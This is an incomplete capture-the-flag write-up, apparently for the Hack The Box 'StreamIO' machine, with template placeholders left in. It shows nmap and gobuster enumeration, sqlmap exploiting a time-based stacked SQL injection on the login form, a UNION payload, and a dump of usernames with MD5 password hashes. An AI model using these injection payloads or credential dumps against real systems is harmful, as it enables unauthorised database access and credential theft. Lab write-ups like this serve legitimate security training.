
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sV -sC streamio.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-30 09:30 EDT
Nmap scan report for streamio.htb (10.129.151.80)
Host is up (0.029s latency).
Not shown: 986 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-30 20:30:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Streamio
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2026-09-30T20:31:29+00:00; +7h00m02s from scanner time.
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-30T20:30:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.17 seconds

```

### Service Enumeration

```
gobuster dir -u https://streamio.htb -w  /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -k

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/images               (Status: 301) [Size: 151] [--> https://streamio.htb/images/]
/Images               (Status: 301) [Size: 151] [--> https://streamio.htb/Images/]
/admin                (Status: 301) [Size: 150] [--> https://streamio.htb/admin/]
/css                  (Status: 301) [Size: 148] [--> https://streamio.htb/css/]
/js                   (Status: 301) [Size: 147] [--> https://streamio.htb/js/]
/fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> https://streamio.htb/IMAGES/]
/Fonts                (Status: 301) [Size: 150] [--> https://streamio.htb/Fonts/]
/Admin                (Status: 301) [Size: 150] [--> https://streamio.htb/Admin/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 148] [--> https://streamio.htb/CSS/]
/JS                   (Status: 301) [Size: 147] [--> https://streamio.htb/JS/]
/*docroot*            (Status: 400) [Size: 3420]
Progress: 15630 / 87663 (17.83%)^C
                                                                       
```

```
curl https://streamio.htb/admin/master.php -k
<h1>Movie managment</h1>
Only accessable through includes
```

```
gobuster dir -u https://watch.streamio.htb/ -w /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -k -x .php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/Search.php           (Status: 200) [Size: 253887]
/Index.php            (Status: 200) [Size: 2829]

```

---
## SQL injection

How you gained initial access to the machine.

### Vulnerability

Description of the vulnerability exploited.

### Exploitation

```
POST /login.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=0jdod8f7qlb5le0t4h91nofbs9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: https://streamio.htb
Referer: https://streamio.htb/login.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=test&password=test
                                 
```

```shell
sqlmap -r req3.txt --batch --force-ssl
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[)]_____ ___ ___  {1.9.11#stable}                                                                                                                                                                                                   
|_ -| . [']     | .'| . |                                                                                                                                                                                                                   
|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:21:28 /2026-09-30/

[14:21:28] [INFO] parsing HTTP request from 'req3.txt'
[14:21:28] [INFO] testing connection to the target URL
[14:21:28] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:21:28] [INFO] testing if the target URL content is stable
[14:21:28] [INFO] target URL content is stable
[14:21:28] [INFO] testing if POST parameter 'username' is dynamic
[14:21:29] [WARNING] POST parameter 'username' does not appear to be dynamic
[14:21:29] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[14:21:29] [INFO] testing for SQL injection on POST parameter 'username'
[14:21:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:21:30] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:21:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:21:31] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:21:32] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:21:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:21:33] [INFO] testing 'Generic inline queries'
[14:21:33] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:21:34] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:21:45] [INFO] POST parameter 'username' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable 
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'Microsoft SQL Server/Sybase' extending provided level (1) and risk (1) values? [Y/n] Y
[14:21:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:21:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:21:48] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=test';WAITFOR DELAY '0:0:5'--&password=test
---
[14:22:04] [INFO] testing Microsoft SQL Server
[14:22:04] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[14:22:09] [INFO] confirming Microsoft SQL Server
[14:22:15] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2019 or 11 or 2016 or 2022
web application technology: Microsoft IIS 10.0, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
[14:22:15] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/streamio.htb'
[14:22:15] [WARNING] your sqlmap version is outdated

[*] ending @ 14:22:15 /2026-09-30/


```

```
sqlmap -r req3.txt --schema --batch --force-ssl
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:29:26 /2026-09-30/

[14:29:26] [INFO] parsing HTTP request from 'req3.txt'
[14:29:26] [INFO] resuming back-end DBMS 'microsoft sql server' 
[14:29:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=test';WAITFOR DELAY '0:0:5'--&password=test
---
[14:29:26] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2022 or 2016 or 10 or 2019 or 11
web application technology: Microsoft IIS 10.0, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
[14:29:26] [INFO] enumerating database management system schema
[14:29:26] [INFO] fetching database names
[14:29:26] [INFO] fetching number of databases
[14:29:26] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                             
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[14:29:37] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[14:29:47] [INFO] adjusting time delay to 1 second due to good response times
6
[14:29:48] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
model
[14:30:19] [INFO] retrieved: msdb
[14:30:38] [INFO] retrieved: ST
[14:31:23] [ERROR] invalid character detected. retrying..
[14:31:23] [WARNING] increasing time delay to 2 seconds
REAMIO
[14:32:04] [INFO] retrieved: streamio_backup
[14:33:59] [INFO] retrieved: tempdb
[14:34:49] [INFO] retrieved: 
[14:34:50] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[14:34:50] [INFO] fetching tables for databases: STREAMIO, model, msdb, streamio_backup, tempdb
[14:34:50] [INFO] fetching number of tables for database 'streamio_backup'
[14:34:50] [INFO] retrieved: 
[14:34:50] [INFO] retrieved: 0
[14:34:56] [INFO] fetching number of tables for database 'STREAMIO'
[14:34:56] [INFO] retrieved: 2
[14:35:02] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
dbo.movies
[14:36:35] [INFO] retrieved: dbo.users
[14:37:23] [INFO] fetching number of tables for database 'msdb'
[14:37:23] [INFO] retrieved: d3
[14:37:31] [INFO] retrieved: 0
[14:37:37] [INFO] fetching number of tables for database 'model'
[14:37:37] [INFO] retrieved: 
[14:37:37] [INFO] retrieved: 0
[14:37:43] [INFO] fetching number of tables for database 'tempdb'
[14:37:43] [INFO] retrieved: 0
[14:37:48] [INFO] fetched tables: 'STREAMIO..movies', 'STREAMIO..users'
[14:37:48] [INFO] fetching columns for table 'movies' in database 'STREAMIO'
[14:37:48] [INFO] retrieved: 6
[14:37:56] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                                                    
id
[14:38:17] [INFO] retrieved: 
[14:38:29] [ERROR] invalid character detected. retrying..
[14:38:29] [WARNING] increasing time delay to 3 seconds
int
[14:39:08] [INFO] retrieved: imdb
[14:39:48] [INFO] retrieved: f
[14:40:10] [ERROR] invalid character detected. retrying..
[14:40:10] [WARNING] increasing time delay to 4 seconds


```

payload

```
' UNION SELECT 1,@@version,3,4,5,6--  
```


hashes:

```
James :c660060492d9edcaa8332d89c99c9239 :1,Theodore :925e5408ecb67aea449373d668b7359e :1,Samantha :083ffae904143c4796e464dac33c1f7d :1,Lauren :08344b85b329d7efd611b7a7743e8a09 :1,William :d62be0dc82071bccc1322d64ec5b6c51 :1,Sabrina :f87d3c0d6c8fd686aacc6627f1f493a5 :1,Robert :f03b910e2bd0313a23fdd7575f34a694 :1,Thane :3577c47eb1e12c8ba021611e1280753c :1,Carmon :35394484d89fcfdb3c5e447fe749d213 :1,Barry :54c88b2dbd7b1a84012fabc1a4c73415 :1,Oliver :fd78db29173a5cf701bd69027cb9bf6b :1,Michelle :b83439b16f844bd6ffe35c02fe21b3c0 :1,Gloria :0cfaaaafb559f081df2befbe66686de0 :1,Victoria :b22abb47a02b52d5dfa27fb0b534f693 :1,Alexendra :1c2b3d8270321140e5153f6637d3ee53 :1,Baxter :22ee218331afd081b0dcd8115284bae3 :1,Clara :ef8f3d30a856cf166fb8215aca93e9ff :1,Barbra :3961548825e3e21df5646cafe11c6c76 :1,Lenord :ee0b8a0937abd60c2882eacb2f8dc49f :1,Austin :0049ac57646627b8d7aeaccf8b6a936f :1,Garfield :8097cedd612cc37c29db152b6e9edbd3 :1,Juliette :6dcd87740abb64edfa36d170f0d5450d :1,Victor :bf55e15b119860a6e6b5a164377da719 :1,Lucifer :7df45a9e3de3863807c026ba48e55fb3 :1,Bruno :2a4e2cf22dd8fcb45adcb91be1e22ae8 :1,Diablo :ec33265e5fc8c2f1b0c137bb7b3632b5 :1,Robin :dc332fb5576e9631c9dae83f194f8e70 :1,Stan :384463526d288edcc95fc3701e523bc7 :1,yoshihide :b779ba15cedfd22a023c4d8bcf5f2332 :1,admin :665a50ac9eaa781e4f7f04199db97a11 :0

```

---
## User Flag

### Lateral Movement (if applicable)

Steps to move from initial foothold to user access.

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)